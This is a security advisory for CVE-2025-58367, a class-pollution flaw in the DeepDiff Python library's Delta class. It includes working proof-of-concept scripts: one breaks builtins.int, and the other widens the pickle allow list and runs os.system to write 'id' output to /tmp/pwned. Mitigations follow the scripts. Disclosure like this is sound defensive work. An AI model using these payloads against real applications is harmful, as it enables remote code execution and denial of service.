# [C] DeepDiff Class Pollution in Delta class leading to DoS, Remote Code Execution, and more

## Summary
Severity: Critical
Advisory: GHSA-mw26-5g2v-hqw3
CVE: CVE-2025-58367
CWE: CWE-915
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-09-03
Source: https://github.com/advisories/GHSA-mw26-5g2v-hqw3
Type: github-advisory

## Affected
- PyPI: `deepdiff` — affected >=5.0.0 <8.6.1

## Details
### Summary
[Python class pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/) is a novel vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The `Delta` class is vulnerable to class pollution via its constructor, and when combined with a gadget available in DeltaDiff itself, it can lead to Denial of Service and Remote Code Execution (via insecure [Pickle](https://docs.python.org/3/library/pickle.html) deserialization).

The gadget available in DeepDiff allows `deepdiff.serialization.SAFE_TO_IMPORT` to be modified to allow dangerous classes such as `posix.system`, and then perform insecure Pickle deserialization via the Delta class. This potentially allows any Python code to be executed, given that the input to `Delta` is user-controlled.

Depending on the application where DeepDiff is used, this can also lead to other vulnerabilities. For example, in a web application, it might be possible to bypass authentication via class pollution.

### Details

The `Delta` class can take different object types as a parameter in its constructor, such as a `DeltaDiff` object, a dictionary, or even just bytes (that are deserialized via Pickle).

When it takes a dictionary, it is usually in the following format:
```py
Delta({"dictionary_item_added": {"root.myattr['foo']": "bar"}})
```

Trying to apply class pollution here does not work, because there is already a filter in place: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23

However, this code only runs when parsing the path from a string.
The `_path_to_elements` function helpfully returns the given input if it is already a list/tuple:
https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53

This means that it is possible to pass the path as the internal representation used by Delta, bypassing the filter:

```py
Delta(
    {
        "dictionary_item_added": {
            (
                ("root", "GETATTR"),
                ("__init__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("PWNED", "GET"),
            ): 1337
        }
    },
)
```

Going back to the possible inputs of `Delta`, when it takes a `bytes` as input, it uses pickle to deserialize them.
Care was taken by DeepDiff to prevent arbitrary code execution via the `SAFE_TO_IMPORT` allow list.
https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98
However, using the class pollution in the `Delta`, an attacker can add new entries to this `set`.

This then allows a second call to `Delta` to [unpickle an insecure class](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) that runs `os.system`, for example.

#### Using dict

Usually, class pollution [does not work](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca#technical-details) when traversal starts at a `dict`/`list`/`tuple`, because it is not possible to reach `__globals__` from there.
However, using two calls to `Delta` (or just one call if the target dictionary that already contains at least one entry) it is possible to first change one entry of the dictionary to be of type `deepdiff.helper.Opcode`, which then allows traversal to `__globals__`, and notably `sys.modules`, which in turn allows traversal to any module already loaded by Python.
Passing `Opcode` around can be done via pickle, which `Delta` will happily accept given it is in the default allow list.

### Proof of Concept

With deepdiff 8.6.0 installed, run the following scripts for each proof of concept.
All input to `Delta` is assumed to be user-controlled.

#### Denial of Service

This script will pollute the value of `builtins.int`, preventing the class from being used and making code crash whenever invoked.

```py
# ------------[ Setup ]------------
import pickle

from deepdiff.helper import Opcode

pollute_int = pickle.dumps(
    {
        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
        "dictionary_item_added": {
            (
                ("root", "GETATTR"),
                ("tmp", "GET"),
                ("__repr__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("__builtins__", "GET"),
                ("int", "GET"),
            ): "no longer a class"
        },
    }
)


assert isinstance(pollute_int, bytes)

# ------------[ Exploit ]------------
# This could be some example, vulnerable, application.
# The inputs above could be sent via HTTP, for example.

from deepdiff import Delta

# Existing dictionary; it is assumed that it contains
# at least one entry, otherwise a different Delta needs to be
# applied first, adding an entry to the dictionary.
mydict = {"tmp": "foobar"}

# Before pollution
print(int("41") + 1)

# Apply Delta to mydict
result = mydict + Delta(pollute_int)

print(int("1337"))
```

```shell
$ python poc_dos.py
42
Traceback (most recent call last):
  File "/tmp/poc_dos.py", line 43, in <module>
    print(int("1337"))
TypeError: 'str' object is not callable
```

#### Remote Code Execution

This script will create a file at `/tmp/pwned` with the output of `id`.

```py
# ------------[ Setup ]------------
import os
import pickle

from deepdiff.helper import Opcode

pollute_safe_to_import = pickle.dumps(
    {
        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
        "set_item_added": {
            (
                ("root", "GETATTR"),
                ("tmp", "GET"),
                ("__repr__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("sys", "GET"),
                ("modules", "GETATTR"),
                ("deepdiff.serialization", "GET"),
                ("SAFE_TO_IMPORT", "GETATTR"),
            ): set(["posix.system"])
        },
    }
)


# From https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class RCE:
    def __reduce__(self):
        cmd = "id > /tmp/pwned"
        return os.system, (cmd,)


# Wrap object with dictionary so that Delta does not crash
rce_pickle = pickle.dumps({"_": RCE()})

assert isinstance(pollute_safe_to_import, bytes)
assert isinstance(rce_pickle, bytes)

# ------------[ Exploit ]------------
# This could be some example, vulnerable, application.
# The inputs above could be sent via HTTP, for example.

from deepdiff import Delta

# Existing dictionary; it is assumed that it contains
# at least one entry, otherwise a different Delta needs to be
# applied first, adding an entry to the dictionary.
mydict = {"tmp": "foobar"}

# Apply Delta to mydict
result = mydict + Delta(pollute_safe_to_import)

Delta(rce_pickle)  # no need to apply this Delta
```

```shell
$ python poc_rce.py
$ cat /tmp/pwned
uid=1000(dtc) gid=100(users) groups=100(users),1(wheel)
```

### Who is affected?

Only applications that pass (untrusted) user input directly into `Delta` are affected.

While input in the form of `bytes` is the most flexible, there are certainly other gadgets, depending on the application, that can be used via just a dictionary. This dictionary could easily be parsed, for example, from JSON. One simple example would be overriding `app.secret_key` of a Flask application, which would allow an attacker to sign arbitrary cookies, leading to an authentication bypass.

### Mitigations

A straightforward mitigation is preventing traversal through private keys, like it is already done in the path parser.
This would have to be implemented in both `deepdiff.path._get_nested_obj` and `deepdiff.path._get_nested_obj_and_force`,
and possibly in `deepdiff.delta.Delta._get_elements_and_details`.
Example code that raises an error when traversing these properties:
```py
if elem.startswith("__") and elem.endswith("__"):
  raise ValueError("traversing dunder attributes is not allowed")
```

However, if it is desirable to still support attributes starting and ending with `__`, but still protect against this vulnerability, it is possible to only forbid `__globals__` and `__builtins__`, which stops the most serious cases of class pollution (but not all).
This was the solution adopted by pydash: https://github.com/dgilland/pydash/issues/180

## References
- https://github.com/seperman/deepdiff/security/advisories/GHSA-mw26-5g2v-hqw3
- https://nvd.nist.gov/vuln/detail/CVE-2025-58367
- https://github.com/dgilland/pydash/issues/180
- https://github.com/dgilland/pydash/commit/2015f0a4bcdbc3a5b27652e38fe97b3ee13ac15f
- https://github.com/seperman/deepdiff/commit/c69c06c13f75e849c770ade3f556cd16209fd183
- https://github.com/seperman/deepdiff
- https://github.com/seperman/deepdiff/releases/tag/8.6.1
